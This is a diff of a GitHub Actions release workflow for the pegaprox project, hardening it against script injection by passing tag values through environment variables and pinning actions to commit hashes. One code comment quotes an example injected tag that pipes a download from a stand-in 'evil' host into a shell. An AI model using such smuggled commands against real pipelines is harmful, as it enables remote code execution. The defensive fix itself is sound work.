@@ -31,11 +31,19 @@ jobs:
       aptver:  ${{ steps.poll.outputs.aptver }}
     steps:
       - id: ver
+        # NS 2026-05-30 — release.tag_name and inputs.tag are user-controllable
+        # by anyone with push/workflow_dispatch rights. Interpolating ${{ }} inline
+        # into the shell `run:` block evaluates before quoting and lets a tag like
+        # `'; curl evil | sh; #` escape into the script. Read them via env vars
+        # so the shell quotes naturally.
+        env:
+          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
+          INPUT_TAG:        ${{ inputs.tag }}
         run: |
-          if [ -n "${{ github.event.release.tag_name }}" ]; then
-            V="${{ github.event.release.tag_name }}"
-          elif [ -n "${{ inputs.tag }}" ]; then
-            V="${{ inputs.tag }}"
+          if [ -n "$RELEASE_TAG_NAME" ]; then
+            V="$RELEASE_TAG_NAME"
+          elif [ -n "$INPUT_TAG" ]; then
+            V="$INPUT_TAG"
           else
             V="dev-$(date +%Y%m%d-%H%M%S)"
           fi
@@ -89,7 +97,7 @@ jobs:
     needs: prepare
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
 
       - name: Tools installieren
         run: |
@@ -200,7 +208,7 @@ jobs:
              "pegaprox-lxc-amd64.tar.xz"
 
       - name: Artefakt sichern
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: lxc-template
           path: pegaprox-*lxc*.tar.xz
@@ -213,7 +221,7 @@ jobs:
     needs: prepare
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
 
       - name: Tools installieren
         run: |
@@ -310,7 +318,7 @@ jobs:
              "pegaprox-vm-amd64.qcow2"
 
       - name: Artefakt sichern
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: vm-image
           path: pegaprox-*vm*.qcow2
@@ -327,7 +335,7 @@ jobs:
     continue-on-error: true
     steps:
       - name: VM-qcow2 holen
-        uses: actions/download-artifact@v4
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           name: vm-image
           path: .
@@ -379,7 +387,7 @@ jobs:
           qm destroy "$VMID" --purge
 
       - name: vzdump sichern
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
         with:
           name: vzdump-backup
           path: pegaprox-*-vzdump.vma.zst
@@ -394,7 +402,7 @@ jobs:
     if: ${{ always() && github.event_name == 'release' && needs.build-lxc.result == 'success' && needs.build-vm.result == 'success' }}
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/download-artifact@v4
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
         with:
           path: dist
 
@@ -406,7 +414,7 @@ jobs:
           cat SHA256SUMS.txt
 
       - name: An Release anhängen
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2.6.2
         with:
           tag_name: ${{ needs.prepare.outputs.version }}
           files: |
